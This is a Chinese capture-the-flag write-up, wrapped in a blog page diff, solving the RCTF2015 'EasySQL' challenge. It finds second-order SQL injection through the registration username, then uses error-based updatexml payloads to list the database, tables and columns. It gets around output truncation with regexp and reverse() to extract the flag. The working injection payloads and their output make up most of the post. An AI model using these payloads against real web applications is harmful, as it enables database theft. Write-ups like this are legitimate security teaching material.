@@ -1,0 +1,46 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>&lt;RCTF2015&gt;EasySQL | d0ud</title><script>var config = </script><link rel="stylesheet" href="/css/arknights.css"><link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.4.0/styles/atom-one-dark-reasonable.min.css"><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><meta name="generator" content="Hexo 5.4.1"><link rel="alternate" href="/atom.xml" title="d0ud" type="application/atom+xml">
+</head><body style="background-image:url(https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg);"><div id="cursor-container"><div id="cursor-outer"></div><div id="cursor-effect"></div></div><main><header><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><ol class="navContent"><li class="navItem"><a href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem"><a href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>&lt;RCTF2015&gt;EasySQL</h1></div><hr><div id="post-content"><p>打开题目，测试功能。<br>注册，登录，修改密码，那么极有可能存在二次注入。<br>经过测试，发现如果注册的用户名含有双引号，在修改密码后页面回显报错信息。例如</p>
+<blockquote>
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘“a”” and pwd=’72ea3f1e65a1d2b8046e7fb756498dbd’’ at line 1</p>
+</blockquote>
+<p>不难猜测语句为</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> ... <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span>&quot;...&quot; <span class="hljs-keyword">and</span> pwd<span class="hljs-operator">=</span><span class="hljs-string">&#x27;...&#x27;</span> ;<br></code></pre></td></tr></table></figure>
+<p>由于无其他查询回显页面，尝试报错注入</p>
+<p>库名</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">aaaaa&quot;||updatexml(1,(concat(0x7e,(database()),0x7e)),1)#<br></code></pre></td></tr></table></figure>
+<blockquote>
+<p>XPATH syntax error: ‘~web_sqli~’</p>
+</blockquote>
+<p>表名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">aaaaa&quot;||updatexml(1,(concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x7e)),1)#<br></code></pre></td></tr></table></figure>
+<blockquote>
+<p>XPATH syntax error: ‘~article,flag,users~’</p>
+</blockquote>
+<p>列名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">bbbb&quot;||updatexml(1,(concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flag&#x27;)),0x7e)),1)#<br></code></pre></td></tr></table></figure>
+<blockquote>
+<p>XPATH syntax error: ‘<del>flag</del>‘</p>
+</blockquote>
+<p>数据</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">ddddd&quot;||updatexml(1,(concat(0x7e,(select(group_concat(flag))from(flag)),0x7e)),1)#<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>XPATH syntax error: ‘~RCTF{Good job! But flag not her’</p>
+</blockquote>
+<p>虚晃一枪，能看出来是截断的，显示16个字符<br>最终发现flag是在表<code>users</code>里，截断函数都被过滤了，没有过滤<code>reverse()</code></p>
+<p>前半段</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">ddddd&quot;||updatexml(1,(concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)),0x7e)),1)#<br></code></pre></td></tr></table></figure>
+<blockquote>
+<p>XPATH syntax error: ‘~xxx,xxx,xxx,xxx,xxx,xxx,xxx,xxx’</p>
+</blockquote>
+<p>可以发现有其他字符干扰，没法完全读取，正则函数未被过滤，尝试使用正则</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">ddddd&quot;||updatexml(1,(concat(0x7e,(select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp(&#x27;^flag&#x27;)),0x7e)),1)#<br></code></pre></td></tr></table></figure>
+<p>配合<code>reverse()</code>得到flag</p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div id="footer-link" style="right: calc(50% - 1px);order: 1;border-right: 1px solid #fe2;padding-left: unset;max-width: calc(50% - 4px);"><a href="/%5BNCTF2019%5DSQLi/">← Next &lt;NCTF2019&gt;SQLi</a></div></div></div></div><div id="bottom-btn"><a id="to-top" onClick="index.scrolltop();" title="to top" style="opacity: 0; display: none;">∧</a></div></article><div class="aside-box"><aside><div id="aside-top"><div id="about"><a href="/" id="logo"><img src="https://localhost/logo.jpg" alt="Logo"></a><h1 id="Dr"><a href="/">d0ud</a></h1><div id="description"><p></p></div><!--if page.published === undefined--><section id="total"><a id="total-archives" href="/archives"><span class="total-title">Archives Total:</span><span class="total-number">3</span></a><div id="total-tags"><span class="total-title">Tags:</span><span class="total-number">2</span></div><div id="total-categories"><span class="total-title">Categories:</span><span class="total-number">1</span></div></section></div><div id="aside-block"></div></div><footer><text>published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></text><text> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknight</a></text><wbr><text>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></text></footer></aside></div></main><canvas id="canvas-dust"></canvas><script>const reset=_=>{}</script><script src="//unpkg.com/@highlightjs/cdn-assets@11.4.0/highlight.min.js"></script><script src="/js/arknights.js"></script><script>document.addEventListener("load",reset())</script></body></html>
